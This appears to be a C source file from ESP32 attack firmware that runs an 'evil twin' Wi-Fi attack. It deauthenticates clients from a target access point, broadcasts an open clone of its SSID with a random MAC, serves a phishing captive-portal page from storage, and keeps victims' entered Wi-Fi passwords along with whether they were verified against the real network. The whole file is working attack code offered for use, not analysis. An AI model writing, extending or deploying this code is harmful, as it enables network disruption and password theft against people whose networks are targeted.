/*
 * attack_eviltwin.c — Evil Twin Attack with Captive Portal Password Capture
 * 
 * Updated: Supports dynamic DevilTwin phishing page from SPIFFS
 * 
 * How it works:
 * 1. Clone target SSID with OPEN security (no password)
 * 2. Victim auto-connects (open AP)
 * 3. Captive portal redirects to fake login page (from DevilTwin/ folder)
 * 4. Victim enters password → stored + verified against real AP
 * 5. LED/Buzzer alert on success
 */

#include "attack_eviltwin.h"
#include "attack_deauth.h"
#include "wifi_controller.h"
#include "wifi_pass_verifier.h"
#include "hardware/buzzer_led.h"
#include "bw16_uart.h"
#include "management_helper.h"
#include "esp_random.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <esp_log.h>
#include <esp_wifi.h>
#include <esp_mac.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <nvs_flash.h>
#include <time.h>

static const char *TAG = "EVIL_TWIN";

#define MAX_CAPTURED 50

// ==================== NEW: extern for webserver page setter ====================
extern void set_active_phishing_page(const char *path);

typedef struct {
    char ssid[33];
    char password[65];
    char bssid_str[18];
    char time_str[32];
    bool verified_correct;
} captured_entry_t;

static captured_entry_t g_captured_data[MAX_CAPTURED];
static int g_captured_count = 0;

static TaskHandle_t g_eviltwin_task = NULL;
static volatile bool g_eviltwin_running = false;

static char g_target_ssid[33];
static char g_evil_ssid[33];
static uint8_t g_target_bssid[6];
static uint8_t g_evil_bssid[6];
static uint8_t g_target_channel;
static bool g_is_5ghz = false;

// ==================== NEW: phishing page path ====================
static char g_phishing_page[64] = {0};

static void generate_random_bssid(uint8_t *mac) {
    esp_fill_random(&mac[3], 3);
    mac[0] = 0x02;
    mac[1] = 0x00;
    mac[2] = 0x00;
}

static void start_evil_ap() {
    wifi_config_t wifi_config = {
        .ap = {
            .ssid_len = 0,
            .channel = g_target_channel,
            .authmode = WIFI_AUTH_OPEN,          // ← OPEN network for auto-connect!
            .ssid_hidden = 0,
            .max_connection = 8,
            .beacon_interval = 100,
        },
    };
    
    strncpy((char*)wifi_config.ap.ssid, g_evil_ssid, 32);
    wifi_config.ap.ssid_len = strlen(g_evil_ssid);
    
    esp_wifi_set_mac(WIFI_IF_AP, g_evil_bssid);
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    ESP_LOGI(TAG, "🔓 Evil Twin AP started: '%s' (OPEN, ch %d)",
             g_evil_ssid, g_target_channel);
}

static void eviltwin_wifi_event_handler(void *arg, esp_event_base_t event_base,
                                         int32_t event_id, void *event_data) {
    if (!g_eviltwin_running) return;
    
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_CONNECTED) {
        ESP_LOGI(TAG, "🔗 Client connected to Evil Twin AP!");
        hw_led_blink(2, 50);
    }
}

static void eviltwin_task_func(void *params) {
    ESP_LOGI(TAG, "🎯 Evil Twin attack started");
    ESP_LOGI(TAG, "   Target SSID: '%s'", g_target_ssid);
    ESP_LOGI(TAG, "   Evil SSID:   '%s' (OPEN)", g_evil_ssid);
    ESP_LOGI(TAG, "   Channel:     %d", g_target_channel);
    if (g_phishing_page[0]) {
        ESP_LOGI(TAG, "   📄 Phishing page: %s", g_phishing_page);
    } else {
        ESP_LOGI(TAG, "   📄 No phishing page (default captive portal)");
    }
    
    g_eviltwin_running = true;
    
    // Step 1: Set active phishing page in webserver
    if (g_phishing_page[0]) {
        set_active_phishing_page(g_phishing_page);
    }
    
    // Step 2: Deauth real AP
    ESP_LOGI(TAG, "📡 Deauthing real AP to hide SSID...");
    
    deauth_target_t target;
    memcpy(target.bssid, g_target_bssid, 6);
    target.channel = g_target_channel;
    
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    deauth_start(&target, 1, broadcast);
    vTaskDelay(pdMS_TO_TICKS(1000));
    
    if (g_is_5ghz && bw16_is_connected()) {
        char json[256];
        snprintf(json, sizeof(json), 
                 "{\"targets\":[{\"bssid\":\"%02X:%02X:%02X:%02X:%02X:%02X\",\"channel\":%d}]}",
                 g_target_bssid[0], g_target_bssid[1], g_target_bssid[2],
                 g_target_bssid[3], g_target_bssid[4], g_target_bssid[5],
                 g_target_channel);
        bw16_deauth_start(json);
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    // Step 3: Start Evil AP
    ESP_LOGI(TAG, "📡 Starting Evil Twin AP (OPEN)...");
    
    esp_event_handler_instance_t instance;
    esp_event_handler_instance_register(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED,
                                        eviltwin_wifi_event_handler, NULL, &instance);
    
    start_evil_ap();
    
    ESP_LOGI(TAG, "🔑 Waiting for victim to connect via captive portal...");
    ESP_LOGI(TAG, "🌐 Captive portal URL: http://192.168.4.1/eviltwin/portal");
    
    uint32_t start_time = xTaskGetTickCount() * portTICK_PERIOD_MS;
    
    while (g_eviltwin_running) {
        vTaskDelay(pdMS_TO_TICKS(100));
        
        uint32_t elapsed = (xTaskGetTickCount() * portTICK_PERIOD_MS) - start_time;
        if (elapsed > 300000) { // 5 min timeout
            ESP_LOGI(TAG, "⏰ Evil Twin timeout after 5 minutes");
            break;
        }
    }
    
    esp_event_handler_instance_unregister(WIFI_EVENT, WIFI_EVENT_STA_CONNECTED, instance);
    eviltwin_cleanup();
    
    ESP_LOGI(TAG, "⏹️  Evil Twin stopped");
    g_eviltwin_running = false;
    g_eviltwin_task = NULL;
    vTaskDelete(NULL);
}

// ==================== UPDATED PUBLIC API ====================
void eviltwin_start(const char *target_ssid, const char *evil_ssid, 
                    const uint8_t *target_bssid, uint8_t channel, 
                    bool is_5ghz, const char *phishing_page) {
    if (g_eviltwin_running) {
        eviltwin_stop();
        vTaskDelay(pdMS_TO_TICKS(500));
    }
    
    strncpy(g_target_ssid, target_ssid, 32);
    strncpy(g_evil_ssid, evil_ssid ? evil_ssid : target_ssid, 32);
    if (target_bssid) memcpy(g_target_bssid, target_bssid, 6);
    g_target_channel = channel;
    g_is_5ghz = is_5ghz;
    
    // Store phishing page path
    if (phishing_page) {
        strncpy(g_phishing_page, phishing_page, sizeof(g_phishing_page) - 1);
        g_phishing_page[sizeof(g_phishing_page) - 1] = '\0';
    } else {
        g_phishing_page[0] = '\0';
    }
    
    generate_random_bssid(g_evil_bssid);
    
    xTaskCreatePinnedToCore(eviltwin_task_func, "eviltwin_task", 6144, NULL, 5, &g_eviltwin_task, 0);
}

void eviltwin_stop(void) {
    g_eviltwin_running = false;
    eviltwin_cleanup();
    if (g_eviltwin_task) {
        vTaskDelay(pdMS_TO_TICKS(200));
        g_eviltwin_task = NULL;
    }
}

void eviltwin_cleanup(void) {
    // Clear active phishing page
    set_active_phishing_page(NULL);
    g_phishing_page[0] = '\0';
    
    esp_wifi_stop();
    esp_wifi_set_mode(WIFI_MODE_NULL);
    wifictl_restore_ap_mac();
    deauth_stop();
    if (g_is_5ghz && bw16_is_connected()) {
        bw16_deauth_stop();
        bw16_eviltwin_stop();
    }
    wifictl_mgmt_ap_start();
}

bool eviltwin_is_running(void) { return g_eviltwin_running; }

int captured_data_get_count(void) { return g_captured_count; }

const char* captured_data_get(int index, char *ssid_buf, char *pass_buf, char *time_buf) {
    if (index < 0 || index >= g_captured_count) return NULL;
    strcpy(ssid_buf, g_captured_data[index].ssid);
    strcpy(pass_buf, g_captured_data[index].password);
    strcpy(time_buf, g_captured_data[index].time_str);
    return time_buf;
}

bool captured_data_is_verified(int index) {
    if (index < 0 || index >= g_captured_count) return false;
    return g_captured_data[index].verified_correct;
}

void captured_data_clear(void) {
    g_captured_count = 0;
    memset(g_captured_data, 0, sizeof(g_captured_data));
    ESP_LOGI(TAG, "Captured data cleared");
}
